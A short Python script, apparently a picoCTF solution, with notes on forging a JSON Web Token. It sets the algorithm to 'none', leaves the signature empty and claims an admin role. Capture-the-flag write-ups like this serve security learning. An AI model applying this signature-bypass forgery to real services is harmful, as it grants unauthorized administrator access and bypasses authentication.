import jwt

'''


This is a algorithm JWT vulnerability for the JAUth picoCTF challenge. 
First I tried to bruteforce the secret key, no luck there, then I tried
to modify the payload + remove signature, and all sorts of weird combinations.


But it was pretty simple, we just had to tell the server that the JWT token had NO ALGORITHM
(no security or intergrity checks), then simply remove the signature portion. However, my JWT token at the
end of doing that looked like this:

header.payload

the HINT says that a valid JWT needs TWO ".", so I just did this

header.payload.(NOTHING)
And it finally worked. This can be abused in the real world (small chance, probably done on purpose to share
    API access between company developers without sharing their secret keys, probably possible
    to discover such an endpoint through fuzzing or recon.)

'''

# Original header and payload
header = {
    "alg": "none",
    "typ": "JWT"
}
payload = {
  "auth": 1723520759334,
  "agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
  "role": "admin",
  "iat": 1723520759
}

# Encode the JWT without a signature
token = jwt.encode(payload, key=None, algorithm='none', headers=header)

print(f"JWT: {token}")

# Header: "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0."
# Payload: "eyJhdXRoIjoxNzIzNTIwNzU5MzM0LCJhZ2VudCI6Ik1vemlsbGEvNS4wIChNYWNpbnRvc2g7IEludGVsIE1hYyBPUyBYIDEwXzE1XzcpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMjcuMC4wLjAgU2FmYXJpLzUzNy4zNiIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTcyMzUyMDc1OX0"
# Signature: '.'